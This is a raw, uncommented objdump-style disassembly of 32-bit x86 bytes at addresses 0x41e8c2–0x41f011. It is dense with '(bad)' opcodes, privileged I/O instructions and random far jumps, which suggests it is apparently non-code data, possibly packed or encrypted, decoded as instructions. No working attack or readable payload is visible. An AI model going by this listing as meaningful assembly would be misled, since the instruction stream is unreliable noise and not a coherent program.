  41e8c2:	mov    ch,0x5d
  41e8c4:	mov    al,ds:0x5ecea313
  41e8c9:	or     al,ah
  41e8cb:	mov    ebp,0xb0db00ab
  41e8d0:	pop    esp
  41e8d1:	das    
  41e8d2:	xor    eax,0x44c15bca
  41e8d7:	js     0x41e8bf
  41e8d9:	add    al,BYTE PTR ss:[eax+edx*1]
  41e8dd:	ret    
  41e8de:	jmp    0x41e956
  41e8e0:	xor    DWORD PTR [eax+0x18],esp
  41e8e3:	aaa    
  41e8e4:	pop    eax
  41e8e5:	lds    edx,FWORD PTR [edx]
  41e8e7:	xor    esi,DWORD PTR [ebx+0x7d]
  41e8ea:	mov    edx,DWORD PTR [edx+0x5b5f928a]
  41e8f0:	push   0xe71a88cf
  41e8f5:	xchg   DWORD PTR [ebx],eax
  41e8f7:	aad    0xd0
  41e8f9:	or     BYTE PTR [edi],dh
  41e8fb:	std    
  41e8fc:	gs enter 0xb712,0xff
  41e901:	cmp    eax,0xdd3cf347
  41e906:	mov    ebp,0x16ded814
  41e90b:	add    al,0x44
  41e90d:	xor    DWORD PTR [edi+0x2e32166a],edi
  41e913:	fsubr  st,st(7)
  41e915:	add    dh,BYTE PTR [eax+0x2e4ae38e]
  41e91b:	mov    BYTE PTR [esi],dl
  41e91d:	and    DWORD PTR [edx],ebp
  41e91f:	mov    dl,0xbe
  41e921:	sbb    DWORD PTR ds:0x3031f917,edx
  41e927:	dec    ecx
  41e928:	ss dec eax
  41e92a:	aam    0xd1
  41e92c:	daa    
  41e92d:	xchg   ebp,eax
  41e92e:	cmc    
  41e92f:	mov    ecx,ebx
  41e931:	dec    ebp
  41e932:	sbb    ebp,DWORD PTR [ecx-0x31]
  41e935:	xlat   BYTE PTR ds:[ebx]
  41e936:	mov    BYTE PTR [edx+0x3a55e39c],0xc8
  41e93d:	jno    0x41e9a4
  41e93f:	mov    ds:0x92c25340,al
  41e944:	dec    edx
  41e945:	(bad)  
  41e946:	cmp    DWORD PTR [eax+edi*1+0x163bf1b7],edi
  41e94d:	mov    eax,ds:0x5eb2ecd9
  41e952:	mov    esi,0xe954418
  41e957:	test   eax,0xc28b57e3
  41e95c:	sub    bh,BYTE PTR ds:0x85348583
  41e962:	daa    
  41e963:	call   FWORD PTR [edx+0x30c33bf]
  41e969:	(bad)  
  41e96b:	pop    esp
  41e96c:	pop    es
  41e96d:	or     al,0xc7
  41e96f:	mov    dh,BYTE PTR [edi+0x1f]
  41e972:	pop    ecx
  41e973:	(bad)  
  41e975:	sbb    al,BYTE PTR [ebp-0x478b21e9]
  41e97b:	pop    ecx
  41e97c:	sbb    al,0x98
  41e97e:	ds out 0x3,eax
  41e981:	(bad)  [edx+0x59]
  41e984:	test   WORD PTR [edx+0x8c229ed],bx
  41e98b:	pop    ebp
  41e98c:	xchg   edx,eax
  41e98d:	fs adc ah,BYTE PTR es:[edi]
  41e991:	pop    ebp
  41e992:	not    DWORD PTR [esi]
  41e994:	sti    
  41e995:	mov    esp,0x7e1085ab
  41e99a:	sti    
  41e99b:	sub    al,0xa
  41e99d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e99e:	ror    BYTE PTR [ebp+0x7549240a],0x71
  41e9a5:	pop    edx
  41e9a6:	mov    al,0x86
  41e9a8:	adc    edi,DWORD PTR [ebp+0x1823cf5a]
  41e9ae:	xor    eax,0x1083744a
  41e9b3:	in     al,dx
  41e9b4:	dec    edx
  41e9b5:	sbb    dh,BYTE PTR [esi+0x1a]
  41e9b8:	call   0x741ea72
  41e9bd:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  41e9c3:	pop    ds
  41e9c4:	xchg   BYTE PTR [ebx],bl
  41e9c6:	mov    edx,0x836cdfd0
  41e9cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9cc:	add    al,0x67
  41e9ce:	add    DWORD PTR [eax],eax
  41e9d0:	xchg   BYTE PTR [edx],al
  41e9d2:	add    BYTE PTR [eax],al
  41e9d4:	fwait
  41e9d5:	add    al,bh
  41e9d7:	mov    ecx,0x6bdb5684
  41e9dc:	inc    ecx
  41e9dd:	data16 loop 0x41e96a
  41e9e0:	push   ecx
  41e9e1:	retf   
  41e9e2:	dec    esp
  41e9e3:	sub    ah,BYTE PTR [edx]
  41e9e5:	adc    edi,ecx
  41e9e7:	jmp    0x7d50:0x8acedee0
  41e9ee:	jge    0x41ea5f
  41e9f0:	popa   
  41e9f1:	add    ah,BYTE PTR [ebx+0x1a]
  41e9f4:	(bad)  
  41e9f5:	stos   DWORD PTR es:[edi],eax
  41e9f6:	add    bl,BYTE PTR [ecx]
  41e9f8:	mov    ah,0x1b
  41e9fa:	scas   eax,DWORD PTR es:[edi]
  41e9fb:	mov    cl,0xb6
  41e9fd:	(bad)  
  41e9ff:	xor    BYTE PTR [edx+0x5],dl
  41ea02:	call   0x4bf8dd4d
  41ea07:	(bad)  
  41ea08:	adc    al,0x16
  41ea0a:	in     al,0xed
  41ea0c:	xlat   BYTE PTR ds:[ebx]
  41ea0d:	jmp    0xa68e:0xffff6db5
  41ea14:	mov    esi,0x171c10da
  41ea19:	push   ebx
  41ea1a:	int    0xeb
  41ea1c:	add    dh,al
  41ea1e:	mov    ebp,DWORD PTR [edi]
  41ea20:	jp     0x41e9f7
  41ea22:	jnp    0x41ea8b
  41ea24:	dec    eax
  41ea25:	sbb    esi,0xd9db640
  41ea2b:	(bad)  
  41ea2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea2d:	dec    edi
  41ea2e:	das    
  41ea2f:	dec    eax
  41ea30:	or     al,0x6d
  41ea32:	inc    edi
  41ea33:	mov    ebp,0x19bbd764
  41ea38:	pop    ebx
  41ea39:	icebp  
  41ea3a:	mov    bh,0x45
  41ea3c:	pushf  
  41ea3d:	fistp  QWORD PTR [edx]
  41ea3f:	sub    ebx,esi
  41ea41:	data16 mov ah,0xf7
  41ea44:	add    BYTE PTR ds:0xa9b2227d,bh
  41ea4a:	jne    0x41e9de
  41ea4c:	mov    edx,0x8e2276a8
  41ea51:	mov    edx,0x182132e0
  41ea56:	jle    0x41ea77
  41ea58:	jo     0x41ea4e
  41ea5a:	in     al,dx
  41ea5b:	sub    edi,0xba8b9d31
  41ea61:	mov    ds:0x3b2fb34c,al
  41ea66:	sti    
  41ea67:	push   ebp
  41ea68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea69:	leave  
  41ea6a:	imul   eax,ebp,0xffffffc7
  41ea6d:	add    esi,edi
  41ea6f:	push   es
  41ea70:	mov    al,0x82
  41ea72:	loope  0x41e9f4
  41ea74:	ins    BYTE PTR es:[edi],dx
  41ea75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea76:	cdq    
  41ea77:	xchg   ebp,eax
  41ea78:	test   al,0x85
  41ea7a:	and    dh,BYTE PTR [edi-0x4c3284c1]
  41ea80:	add    eax,0x4135a291
  41ea85:	mov    al,0x55
  41ea87:	cmp    eax,0x3d90f47a
  41ea8c:	andps  xmm6,XMMWORD PTR [eax+0x36]
  41ea90:	add    al,0x1f
  41ea92:	ja     0x41ea95
  41ea94:	popa   
  41ea95:	sub    al,0xc1
  41ea97:	loope  0x41ea88
  41ea99:	mov    ebx,0x633f9467
  41ea9e:	js     0x41eac9
  41eaa0:	loop   0x41eaba
  41eaa2:	lahf   
  41eaa3:	xor    eax,0xf4ef189e
  41eaa8:	daa    
  41eaa9:	(bad)  
  41eaaa:	bound  esp,QWORD PTR [ecx+0x2f6a434f]
  41eab0:	or     BYTE PTR [edi+ebx*2+0x2d],dh
  41eab4:	enter  0x9dc6,0x8a
  41eab8:	mov    bl,0xec
  41eaba:	jmp    0x41ea42
  41eabc:	mov    ch,0xf4
  41eabe:	les    edx,FWORD PTR [ecx]
  41eac0:	jle    0x41eb15
  41eac2:	mov    DWORD PTR [ebx+edi*4+0x4e6b4dcf],eax
  41eac9:	sbb    BYTE PTR [edi+0x62],al
  41eacc:	int3   
  41eacd:	dec    eax
  41eace:	outs   dx,DWORD PTR ds:[esi]
  41eacf:	add    dh,ah
  41ead1:	inc    ebp
  41ead2:	out    0x1d,al
  41ead4:	pop    ecx
  41ead5:	int3   
  41ead6:	enter  0xeea3,0xcb
  41eada:	fnclex 
  41eadc:	mov    eax,ds:0x937401a3
  41eae1:	mov    ecx,0xf15dc4a0
  41eae6:	and    ch,dh
  41eae8:	pop    es
  41eae9:	sbb    ecx,DWORD PTR [esi+eax*2-0x77]
  41eaed:	gs jae 0x41eae4
  41eaf0:	aam    0x93
  41eaf2:	outs   dx,BYTE PTR ds:[esi]
  41eaf3:	retf   0xe460
  41eaf6:	adc    DWORD PTR [ebx],esp
  41eaf8:	dec    ecx
  41eaf9:	xor    ebp,esp
  41eafb:	add    eax,0x9431b5b8
  41eb00:	ins    BYTE PTR es:[edi],dx
  41eb01:	push   eax
  41eb02:	adc    esi,DWORD PTR [esi-0x3d132084]
  41eb08:	dec    eax
  41eb09:	jb     0x41eab5
  41eb0b:	rcr    BYTE PTR [ebp-0x5b],0x30
  41eb0f:	shr    edx,1
  41eb11:	adc    ecx,DWORD PTR [edi]
  41eb13:	inc    esp
  41eb14:	push   ds
  41eb15:	popa   
  41eb16:	fbld   TBYTE PTR [ebx]
  41eb18:	sbb    al,0x71
  41eb1a:	push   cs
  41eb1b:	inc    esi
  41eb1c:	data16 ins BYTE PTR es:[edi],dx
  41eb1e:	dec    ebx
  41eb1f:	(bad)  
  41eb21:	pop    ecx
  41eb22:	mov    dh,0xfc
  41eb24:	leave  
  41eb25:	fistp  QWORD PTR [ebx]
  41eb27:	aam    0xbb
  41eb29:	mov    al,0x9
  41eb2b:	jmp    0x73ac8184
  41eb30:	nop
  41eb31:	fisttp WORD PTR [edi+0x53]
  41eb34:	inc    eax
  41eb35:	inc    esi
  41eb36:	in     al,dx
  41eb37:	or     BYTE PTR [eax-0x3e],ch
  41eb3a:	mov    eax,0x653de165
  41eb3f:	jb     0x41eb76
  41eb41:	outs   dx,DWORD PTR ds:[esi]
  41eb42:	int3   
  41eb43:	dec    ecx
  41eb44:	jns    0x41eada
  41eb46:	les    edi,FWORD PTR [edi+0x42170952]
  41eb4c:	mov    al,ds:0x2c1d4b3f
  41eb51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb52:	lds    ecx,FWORD PTR [edi]
  41eb54:	jb     0x41eb3b
  41eb56:	lods   eax,DWORD PTR ds:[esi]
  41eb57:	(bad)  
  41eb58:	ds cdq 
  41eb5a:	rcl    DWORD PTR cs:[edi+esi*1],cl
  41eb5e:	xor    DWORD PTR [eax+0x7d6f74e],esp
  41eb64:	(bad)  
  41eb65:	popa   
  41eb66:	dec    eax
  41eb67:	or     ah,BYTE PTR [ebx-0x558f06e8]
  41eb6d:	test   DWORD PTR [edi-0x32],ebp
  41eb70:	cmc    
  41eb71:	mov    ebx,0x6ad9ad87
  41eb76:	pop    edx
  41eb77:	dec    ecx
  41eb78:	(bad)  
  41eb7a:	pop    ebx
  41eb7b:	enter  0xb8bf,0x42
  41eb7f:	mov    al,0xfe
  41eb81:	sub    al,0xf2
  41eb83:	xlat   BYTE PTR ds:[ebx]
  41eb84:	xor    al,0x30
  41eb86:	inc    esi
  41eb87:	pop    esi
  41eb88:	xchg   ecx,eax
  41eb89:	and    ch,BYTE PTR [ebx+0x7e]
  41eb8c:	jl     0x41eb2e
  41eb8e:	repnz cld 
  41eb90:	sbb    DWORD PTR [edx-0x75],ebx
  41eb93:	mov    DWORD PTR [ecx+ebx*4],ecx
  41eb96:	mov    ds:0x2a353527,eax
  41eb9b:	bound  edi,QWORD PTR [edi]
  41eb9d:	lahf   
  41eb9e:	mov    bl,0xdb
  41eba0:	jecxz  0x41eb2d
  41eba2:	not    BYTE PTR [edx]
  41eba4:	jmp    0x41ec0d
  41eba6:	test   DWORD PTR [eax+ebx*1],edx
  41eba9:	lds    ecx,FWORD PTR [ecx]
  41ebab:	ins    BYTE PTR es:[edi],dx
  41ebac:	mov    al,0x2
  41ebae:	or     eax,0x790bdee7
  41ebb3:	jb     0x41ec2d
  41ebb5:	retf   
  41ebb6:	push   cs
  41ebb7:	sub    dl,BYTE PTR [ecx+0x27]
  41ebba:	shl    cl,0x77
  41ebbd:	and    BYTE PTR [edi+0x56da058],bh
  41ebc3:	sub    al,0x4e
  41ebc5:	mov    esi,0xd45c5713
  41ebca:	mov    esp,0x197eccd
  41ebcf:	push   es
  41ebd0:	aaa    
  41ebd1:	aam    0xfa
  41ebd3:	mov    ebx,0x66581615
  41ebd8:	pop    ecx
  41ebd9:	je     0x41ec56
  41ebdb:	or     DWORD PTR [esi+esi*8],edi
  41ebde:	test   BYTE PTR [edx+0x31983b17],cl
  41ebe4:	pop    ecx
  41ebe5:	sbb    DWORD PTR [ebx+0x3f],ebx
  41ebe8:	dec    esi
  41ebe9:	inc    ecx
  41ebea:	scas   al,BYTE PTR es:[edi]
  41ebeb:	xor    eax,0x722ce89
  41ebf0:	into   
  41ebf1:	mov    bl,bh
  41ebf3:	sbb    eax,0x5a99fbfe
  41ebf8:	xchg   ebp,eax
  41ebf9:	pop    edi
  41ebfa:	and    cl,ah
  41ebfc:	fcom   QWORD PTR [ebp-0x24]
  41ebff:	push   cs
  41ec00:	sbb    al,BYTE PTR [esi+0x4458ceda]
  41ec06:	mov    ?,WORD PTR [edx+ebp*8]
  41ec09:	dec    edx
  41ec0a:	add    eax,0x5c27619e
  41ec0f:	or     esp,DWORD PTR [ecx-0x34ad104]
  41ec15:	(bad)  
  41ec16:	int3   
  41ec17:	push   ebp
  41ec18:	push   ebx
  41ec19:	pop    esi
  41ec1a:	cmp    al,0xad
  41ec1c:	repnz lock inc ecx
  41ec1f:	cld    
  41ec20:	add    ch,BYTE PTR [esi+0x2d44bd0e]
  41ec26:	fiadd  DWORD PTR [esi+ecx*8+0x7db88720]
  41ec2d:	jnp    0x41ec8f
  41ec2f:	jl     0x41ec1d
  41ec31:	in     al,0xc8
  41ec33:	sub    DWORD PTR [edx+0x2b0748cb],edi
  41ec39:	jae    0x41ec63
  41ec3b:	mov    esi,0xfc6b01f8
  41ec40:	or     eax,0xae380558
  41ec45:	lahf   
  41ec46:	fmul   st(2),st
  41ec48:	pop    es
  41ec49:	and    eax,0xe1c771df
  41ec4e:	aad    0x15
  41ec50:	fcmovnbe st,st(1)
  41ec52:	pop    esi
  41ec53:	push   ebx
  41ec54:	iret   
  41ec55:	jmp    0x10623e60
  41ec5a:	add    BYTE PTR [eax],al
  41ec5c:	push   ds
  41ec5d:	add    al,0xa7
  41ec5f:	(bad)  
  41ec60:	mov    edi,0xf6dd7ee7
  41ec65:	jp     0x41ec30
  41ec67:	push   esi
  41ec68:	imul   ebx,DWORD PTR [esi],0x698a8784
  41ec6e:	add    DWORD PTR [eax],eax
  41ec70:	xchg   BYTE PTR [edx],al
  41ec72:	add    BYTE PTR [eax],al
  41ec74:	(bad)  
  41ec75:	or     BYTE PTR [ebx-0x79],dh
  41ec78:	loop   0x41ece5
  41ec7a:	imul   ecx,DWORD PTR [ecx],0x7fb058b3
  41ec80:	es mov dh,0x68
  41ec83:	mov    gs,WORD PTR [edx+0x44]
  41ec86:	or     al,cl
  41ec88:	or     eax,0xe46b7cd9
  41ec8d:	sbb    esp,DWORD PTR [eax+0x106421ee]
  41ec93:	pusha  
  41ec94:	push   ecx
  41ec95:	and    DWORD PTR [esp+eiz*8-0x7c],esp
  41ec99:	jmp    0xbd7c:0x91d05c01
  41eca0:	arpl   WORD PTR [eax+esi*1+0x7f],sp
  41eca4:	les    edx,FWORD PTR [ebx-0x3cbb3932]
  41ecaa:	ja     0x41ec95
  41ecac:	sbb    BYTE PTR [ebx],0xbe
  41ecaf:	in     eax,dx
  41ecb0:	or     edi,ebx
  41ecb2:	push   edx
  41ecb3:	out    dx,al
  41ecb4:	test   BYTE PTR [ebp+0x680b2da],bl
  41ecba:	sub    al,0x2c
  41ecbc:	pmullw mm7,mm5
  41ecbf:	hlt    
  41ecc0:	mov    WORD PTR [ebx-0x3a],ds
  41ecc3:	shl    BYTE PTR [ecx+0x3b6e59ea],1
  41ecc9:	sub    esp,DWORD PTR [edx-0x3a96ccc6]
  41eccf:	dec    ecx
  41ecd0:	nop
  41ecd1:	ins    BYTE PTR es:[edi],dx
  41ecd2:	sub    DWORD PTR [eax-0x54],esp
  41ecd5:	adc    bl,bl
  41ecd7:	adc    eax,0x41b3f2df
  41ecdc:	mov    edi,0x4d57c3d8
  41ece1:	jg     0x41eca5
  41ece3:	ins    BYTE PTR es:[edi],dx
  41ece4:	mov    edi,0x67e4067b
  41ece9:	push   ds
  41ecea:	adc    ah,dl
  41ecec:	dec    ecx
  41eced:	jle    0x41ed06
  41ecef:	push   0x771a4b46
  41ecf4:	mov    eax,ds:0x802ac9dc
  41ecf9:	sub    DWORD PTR [ebp+0x74a7085b],esi
  41ecff:	xchg   edi,eax
  41ed00:	lock pop ebp
  41ed02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed03:	jb     0x41ed24
  41ed05:	pop    es
  41ed06:	ret    0x91f7
  41ed09:	mov    ecx,ds
  41ed0b:	sbb    eax,0x81667a15
  41ed10:	ja     0x41eccb
  41ed12:	sub    al,0x14
  41ed14:	mov    DWORD PTR [ebx-0x1604d1b7],ebx
  41ed1a:	mov    al,0x8d
  41ed1c:	sbb    BYTE PTR [ecx],ah
  41ed1e:	sub    ebp,esp
  41ed20:	sbb    al,bl
  41ed22:	ins    DWORD PTR es:[edi],dx
  41ed23:	pushf  
  41ed24:	mov    edx,gs
  41ed26:	push   esi
  41ed27:	jns    0x41ecc7
  41ed29:	div    BYTE PTR [edi]
  41ed2b:	cmp    dh,BYTE PTR [ebp+0x4061bc79]
  41ed31:	xchg   edi,eax
  41ed32:	add    BYTE PTR [edx+esi*2-0x6ed28de],ch
  41ed39:	imul   esi,esp,0x7d
  41ed3c:	lock push ebp
  41ed3e:	(bad)  [ecx]
  41ed40:	pop    esi
  41ed41:	loope  0x41ece3
  41ed43:	mov    edi,0x6e0410fd
  41ed48:	mov    esi,0x22e255ef
  41ed4d:	test   BYTE PTR [ebx-0x38],dl
  41ed50:	mov    ch,0x82
  41ed52:	mov    ecx,0x6df6b3bf
  41ed57:	sbb    eax,ebp
  41ed59:	aad    0x9d
  41ed5b:	mov    eax,ds:0xd55616b7
  41ed60:	es mov ebp,gs
  41ed63:	out    0x68,eax
  41ed65:	push   eax
  41ed66:	aas    
  41ed67:	lods   eax,DWORD PTR ds:[esi]
  41ed68:	icebp  
  41ed69:	mov    DWORD PTR [esi-0x5f3031fe],ecx
  41ed6f:	retf   0xda29
  41ed72:	cs add ch,dl
  41ed75:	sub    BYTE PTR [esi-0x47],ch
  41ed78:	arpl   WORD PTR [esi+0x47],di
  41ed7b:	or     edi,ebx
  41ed7d:	inc    eax
  41ed7e:	and    ebp,eax
  41ed80:	in     al,0xd1
  41ed82:	test   eax,0xf4b02f2c
  41ed87:	and    BYTE PTR [edx+0x7b],bl
  41ed8a:	nop
  41ed8b:	pop    ss
  41ed8c:	xor    bh,BYTE PTR [esi-0x9]
  41ed8f:	out    dx,eax
  41ed90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed91:	bnd jae 0x41ed99
  41ed94:	fnstcw WORD PTR [ecx-0x5f]
  41ed97:	daa    
  41ed98:	in     al,dx
  41ed99:	or     DWORD PTR [ebp+0x11d951fc],0x29855a29
  41eda3:	in     al,dx
  41eda4:	sahf   
  41eda5:	outs   dx,DWORD PTR ds:[esi]
  41eda6:	ror    al,1
  41eda8:	(bad)  
  41eda9:	pop    ds
  41edaa:	sub    ebp,esi
  41edac:	aad    0xf
  41edae:	cdq    
  41edaf:	ror    bh,1
  41edb1:	dec    ebp
  41edb2:	sbb    al,ah
  41edb4:	pusha  
  41edb5:	and    eax,0x8898f97e
  41edba:	in     al,dx
  41edbb:	outs   dx,DWORD PTR ds:[esi]
  41edbc:	sub    ebp,DWORD PTR [bp+si+0x75f]
  41edc1:	stos   DWORD PTR es:[edi],eax
  41edc2:	mov    ds:0xb693313d,al
  41edc7:	lock retf 
  41edc9:	sbb    ecx,0x39
  41edcc:	sti    
  41edcd:	dec    esp
  41edce:	cmp    ebx,esp
  41edd0:	inc    edi
  41edd1:	(bad)  
  41edd3:	xor    BYTE PTR [ecx],0x42
  41edd6:	pop    ds
  41edd7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41edd9:	pushf  
  41edda:	and    eax,0xcef3e84e
  41eddf:	adc    cl,BYTE PTR [esi-0x2850bc2a]
  41ede5:	test   al,0x81
  41ede7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ede8:	adc    DWORD PTR [esi],esp
  41edea:	xchg   DWORD PTR [esi-0x43ed51bd],eax
  41edf0:	jmp    0x1cf6:0x3bc4c5b6
  41edf7:	mov    dl,0x2
  41edf9:	imul   esi,DWORD PTR [edx],0x2
  41edfc:	in     al,0x1b
  41edfe:	jl     0x41ee44
  41ee00:	gs das 
  41ee02:	mov    esp,0x1f5c5d89
  41ee07:	(bad)  
  41ee08:	mov    ecx,0x6cab7b69
  41ee0d:	arpl   di,si
  41ee0f:	push   ss
  41ee10:	jb     0x41edb0
  41ee12:	mov    eax,0xbec17f7c
  41ee17:	bound  esp,QWORD PTR [ecx]
  41ee19:	pusha  
  41ee1a:	mov    ebx,0x67f06cd1
  41ee1f:	call   DWORD PTR [ecx]
  41ee21:	lock sti 
  41ee23:	pop    es
  41ee24:	push   cs
  41ee25:	jne    0x41edff
  41ee27:	xor    DWORD PTR [eax],eax
  41ee29:	add    esi,DWORD PTR [edi+0x18]
  41ee2c:	jge    0x41edb3
  41ee2e:	call   0xb65cd08d
  41ee33:	scas   eax,DWORD PTR es:[edi]
  41ee34:	fdiv   QWORD PTR [eax]
  41ee36:	sbb    bh,BYTE PTR [eax]
  41ee38:	pop    ebp
  41ee39:	sahf   
  41ee3a:	push   ebp
  41ee3b:	pushf  
  41ee3c:	add    ch,BYTE PTR [eax+0x62]
  41ee3f:	test   al,0xc0
  41ee41:	enter  0xee4d,0x7d
  41ee45:	jne    0x41ee5a
  41ee47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee48:	dec    ecx
  41ee49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee4a:	jge    0x41eead
  41ee4c:	xchg   ebx,eax
  41ee4d:	mov    WORD PTR [ecx+0x22],cs
  41ee50:	or     DWORD PTR [edi],esp
  41ee52:	retf   
  41ee53:	stc    
  41ee54:	cmp    al,0xf7
  41ee56:	jo     0x41ee97
  41ee58:	xchg   esp,eax
  41ee59:	ss retf 0x4dea
  41ee5d:	call   0xbfe2:0xf51acf7a
  41ee64:	inc    esi
  41ee65:	in     eax,dx
  41ee66:	dec    edi
  41ee67:	and    cl,BYTE PTR [eax]
  41ee69:	not    DWORD PTR [edx+0x1da20e93]
  41ee6f:	stos   BYTE PTR es:[edi],al
  41ee70:	jnp    0x41ee62
  41ee72:	fimul  DWORD PTR [edi]
  41ee74:	stc    
  41ee75:	pop    es
  41ee76:	out    dx,eax
  41ee77:	inc    edi
  41ee78:	aam    0xad
  41ee7a:	push   es
  41ee7b:	call   0xafed3320
  41ee80:	std    
  41ee81:	cs sbb al,0xef
  41ee84:	bound  eax,QWORD PTR [ebp-0x1bc998ad]
  41ee8a:	daa    
  41ee8b:	jo     0x41eede
  41ee8d:	ins    DWORD PTR es:[edi],dx
  41ee8e:	mov    edi,0x27e786a3
  41ee93:	and    al,0xdf
  41ee95:	mov    BYTE PTR [edi+0x32],ch
  41ee98:	add    BYTE PTR ds:0x1036c70,dh
  41ee9e:	jae    0x41eec2
  41eea0:	cdq    
  41eea1:	sbb    edx,edx
  41eea3:	jns    0x41ef1a
  41eea5:	add    ecx,DWORD PTR [ebx]
  41eea7:	cmp    DWORD PTR [ebx+0x40],ebp
  41eeaa:	xchg   BYTE PTR [ebx],bh
  41eeac:	fsubr  QWORD PTR [edi-0x25]
  41eeaf:	pop    ebp
  41eeb0:	jecxz  0x41ee79
  41eeb2:	pop    edx
  41eeb3:	iret   
  41eeb4:	shr    BYTE PTR [edi],1
  41eeb6:	ins    DWORD PTR es:[edi],dx
  41eeb7:	ins    BYTE PTR es:[edi],dx
  41eeb8:	loope  0x41ef04
  41eeba:	cwde   
  41eebb:	inc    esi
  41eebc:	(bad)  
  41eebd:	sbb    esp,esp
  41eebf:	jne    0x41eef1
  41eec1:	lods   al,BYTE PTR cs:[esi]
  41eec3:	adc    al,0x2b
  41eec5:	repnz adc eax,0xef8bd204
  41eecb:	in     eax,dx
  41eecc:	sahf   
  41eecd:	inc    ebx
  41eece:	icebp  
  41eecf:	cmp    DWORD PTR [ecx],ebx
  41eed1:	cmc    
  41eed2:	push   eax
  41eed3:	int    0x33
  41eed5:	fistp  DWORD PTR [edi]
  41eed7:	les    edi,FWORD PTR [esi]
  41eed9:	push   edi
  41eeda:	xor    al,0x93
  41eedc:	lock mov edx,?
  41eedf:	enter  0xc802,0x3
  41eee3:	mov    ebx,0x95abaa93
  41eee8:	push   cs
  41eee9:	jmp    0x7052:0x830e1e73
  41eef0:	(bad)  
  41eef1:	dec    esi
  41eef2:	add    cl,al
  41eef4:	(bad)  
  41eef5:	iret   
  41eef6:	sbb    al,0xbc
  41eef8:	xor    al,0x18
  41eefa:	add    BYTE PTR [eax],al
  41eefc:	js     0x41ee87
  41eefe:	hlt    
  41eeff:	mov    al,0xf5
  41ef01:	std    
  41ef02:	jl     0x41eecd
  41ef04:	dec    edi
  41ef05:	pop    ds
  41ef06:	cmp    DWORD PTR [ebx+0x60],ebp
  41ef09:	or     ah,BYTE PTR [eax-0x3a]
  41ef0c:	adc    BYTE PTR [ecx+eax*1+0x0],ch
  41ef10:	xchg   BYTE PTR [edx],al
  41ef12:	add    BYTE PTR [eax],al
  41ef14:	cmp    dh,cl
  41ef16:	ins    DWORD PTR es:[edi],dx
  41ef17:	ins    BYTE PTR es:[edi],dx
  41ef18:	lock mov esp,0x4ff17077
  41ef1e:	pop    esp
  41ef1f:	push   edx
  41ef20:	dec    eax
  41ef21:	dec    esp
  41ef22:	in     al,0x86
  41ef24:	clc    
  41ef25:	bound  ecx,QWORD PTR [esi+ecx*4-0x1d]
  41ef29:	int    0x5
  41ef2b:	jmp    0xe328:0xa1f449ae
  41ef32:	push   edi
  41ef33:	stc    
  41ef34:	loop   0x41ef4d
  41ef36:	adc    edi,eax
  41ef38:	sti    
  41ef39:	loop   0x41eee6
  41ef3b:	es xchg ebx,eax
  41ef3d:	aam    0xee
  41ef3f:	or     al,BYTE PTR [ebp-0x1c]
  41ef42:	push   esp
  41ef43:	mov    eax,0xd9c365d3
  41ef48:	mov    cl,0xb9
  41ef4a:	push   cs
  41ef4b:	lods   al,BYTE PTR ds:[esi]
  41ef4c:	and    DWORD PTR ds:0x83d3dfc5,esi
  41ef52:	cs adc al,0x6f
  41ef55:	imul   eax,ebp,0xf32641c0
  41ef5b:	outs   dx,DWORD PTR ds:[esi]
  41ef5c:	fdivr  DWORD PTR [edi+0x36]
  41ef5f:	or     DWORD PTR [esi],ebx
  41ef61:	into   
  41ef62:	jne    0x41efcf
  41ef64:	mov    dh,0x52
  41ef66:	lock data16 and BYTE PTR [eax-0x41],dh
  41ef6b:	add    cl,BYTE PTR [ecx-0x5cb8357]
  41ef71:	and    DWORD PTR [ebp+0x54],esi
  41ef74:	je     0x41ef03
  41ef76:	or     eax,0x5d94cba4
  41ef7b:	nop
  41ef7c:	xlat   BYTE PTR ds:[ebx]
  41ef7d:	nop
  41ef7e:	mov    ds:0x8355291e,eax
  41ef83:	mov    bl,cl
  41ef85:	sbb    esp,ebp
  41ef87:	aaa    
  41ef88:	inc    eax
  41ef89:	push   0xeafcdb43
  41ef8e:	push   ebx
  41ef8f:	mov    ebp,0x26414faa
  41ef94:	mov    ebx,0xe4a75439
  41ef99:	rol    ebp,0x63
  41ef9c:	and    ecx,esi
  41ef9e:	outs   dx,BYTE PTR ds:[esi]
  41ef9f:	mov    eax,ds:0x172b41df
  41efa4:	call   DWORD PTR [edi]
  41efa6:	xor    al,0xbe
  41efa8:	daa    
  41efa9:	sbb    esp,DWORD PTR [ebx+0x26]
  41efac:	jb     0x41f010
  41efae:	sbb    al,0x0
  41efb0:	fwait
  41efb1:	xor    BYTE PTR [esi-0x692ca1df],bh
  41efb7:	inc    esi
  41efb8:	mov    eax,0x482575be
  41efbd:	repnz repnz stc 
  41efc0:	pop    ebx
  41efc1:	lock into 
  41efc3:	out    dx,eax
  41efc4:	or     ecx,DWORD PTR [ebx-0x4d]
  41efc7:	scas   al,BYTE PTR es:[edi]
  41efc8:	add    DWORD PTR [edi+0x52d1425f],0xdb1358f4
  41efd2:	repz sti 
  41efd4:	xchg   esi,eax
  41efd5:	outs   dx,DWORD PTR ds:[esi]
  41efd6:	xchg   edi,eax
  41efd7:	sbb    BYTE PTR ds:0x7c6f5f7a,dl
  41efdd:	mov    edi,0xe1a99b22
  41efe2:	pop    ss
  41efe3:	fs xchg esi,esp
  41efe6:	inc    ebp
  41efe7:	pop    eax
  41efe8:	or     al,0xc0
  41efea:	mov    esp,0x29221524
  41efef:	xchg   edi,eax
  41eff0:	(bad)  
  41eff1:	imul   esi,ebp,0x7
  41eff4:	adc    eax,0xdbe35395
  41eff9:	repnz sub esi,ecx
  41effc:	(bad)  
  41effd:	xor    al,0x37
  41efff:	mov    ecx,0x12fdee6c
  41f004:	or     eax,0x8602ae3b
  41f009:	jp     0x41f064
  41f00b:	daa    
  41f00c:	test   eax,0xc1f6158
  41f011:	loope  0x41f04d
